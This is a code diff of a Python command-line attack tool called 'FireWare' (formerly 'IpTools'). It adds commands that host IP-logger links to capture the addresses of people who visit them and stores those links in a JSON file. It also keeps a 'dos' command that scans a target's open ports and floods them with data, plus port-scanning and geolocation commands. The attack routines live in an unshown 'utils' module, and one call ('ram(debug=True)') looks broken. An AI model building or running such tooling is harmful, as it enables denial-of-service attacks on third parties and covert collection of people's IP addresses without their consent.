@@ -1,47 +1,39 @@
+import ram
 import PyCLI
 import requests
 import os
 import colorama
-import dos
 import geocoder
 import socket
-import IpLogger
+import utils
 import concurrent.futures
-import random
-import string
 
-all_chars = string.ascii_letters + string.digits + string.punctuation
 my_ip = requests.get('https://httpbin.org/ip').json()['origin']
 scanned_port = 0
-colorama.init()
-ports = []
 
-prompt_design = f"\n{colorama.Fore.LIGHTRED_EX}┌─[{colorama.Fore.YELLOW}IpTools{colorama.Fore.LIGHTRED_EX}]{colorama.Fore.LIGHTYELLOW_EX}@{colorama.Fore.LIGHTRED_EX}[{colorama.Fore.WHITE}{os.getlogin()}{colorama.Fore.LIGHTRED_EX}]{colorama.Fore.LIGHTBLACK_EX}:~{colorama.Fore.LIGHTRED_EX}\n└─>{colorama.Fore.YELLOW} $ {colorama.Fore.WHITE}"
+bdd = utils.BDD()
+for nmb, port in enumerate(bdd.info["port"]):
+    utils.Logger_link(bdd.info["url"][nmb], port, my_ip).start()
+del bdd
+
+prompt_design = f"\n{colorama.Fore.LIGHTRED_EX}┌─[{colorama.Fore.YELLOW}FireWare{colorama.Fore.LIGHTRED_EX}]{colorama.Fore.LIGHTYELLOW_EX}@{colorama.Fore.LIGHTRED_EX}[{colorama.Fore.WHITE}{os.getlogin()}{colorama.Fore.LIGHTRED_EX}]{colorama.Fore.LIGHTBLACK_EX}:~{colorama.Fore.LIGHTRED_EX}\n└─>{colorama.Fore.YELLOW} $ {colorama.Fore.WHITE}"
 cli = PyCLI.CLI(prompt=prompt_design, animation=False, logs=False)
 
 @cli.command(alias=["cl"])
 def create_link(url: str, port: int) -> None:
     "Create an Iplogger link."
-    if requests.head(url).status_code != 404:
-        if not port in ports:
-            IpLogger.Logger_link(url=url, port=port, host_ip=my_ip).start()
-            ports.append(port)
-        else:
-            print("The port are already used.")
+    bdd = utils.BDD()
+    if not bdd.exist(port):
+        utils.Logger_link(url, port, my_ip).start()
+        bdd.add(port, url)
     else:
-        print("The URL doesn't existe.")
-
-"""@cli.command(alias=["cfm"])
-def chiffrement(path):
-    file = path.split("/")[-1]
-    path = path.split("/")[::-1]
-    key = "".join(random.choice(all_chars) for x in range(random.randint(26, 32)))
-    print(f"Key: {key}")"""
-
-@cli.command(name="dos")
-def dos_cmd(ip: str, port: int) -> None:
+        print("The port are already used.")
+        print(f"Use the remove_link command to remove the URL hosted on port {port}.")
+        
+@cli.command()
+def dos(ip: str, port: int) -> None:
     "Search all opened port of IPv4 adresse or domain name and send data in opened port."
-    dos.main(ip=ip, port=port)
+    utils.dos(ip=ip, port=port)
 
 @cli.command(alias=["glc"])
 def geolocate(ip: str) -> None:
@@ -81,11 +73,26 @@ def scan_port(ip: str) -> None:
         print(f"{colorama.Fore.LIGHTRED_EX}[{colorama.Fore.YELLOW}+{colorama.Fore.LIGHTRED_EX}]{colorama.Fore.WHITE}{ip}:{i}")
     scanned_port = 0
 
-@cli.command(alias=["vsn"])
-def version() -> None:
-    "Display the version of IP Tool."
-    print("Version: 1.0")
+@cli.command(alias=["sl"])
+def show_link() -> None:
+    "Display list of hosted port."
+    utils.BDD().display()
 
+@cli.command(alias=["rl"])
+def remove_link(port: int) -> None:
+    "Remove hosting port of list."
+    utils.BDD().remove(port=port)
+    print("Restart FireWare for actualise host ports.")
+
+@cli.command(alias=["fo"])
+def file_open():
+    "Open the file who save all info about iplogger links"
+    try:
+        with open("iplogger.json", "r+") as file:
+            print(file.read())
+    except:
+        with open("iplogger.json", "w+") as file:
+            file.close()
+
+ram(debug=True)
 cli.run()
-#ajouter un systeme de save des url iplogger
-#ajouter une commande pour afficher la liste des url iplogger
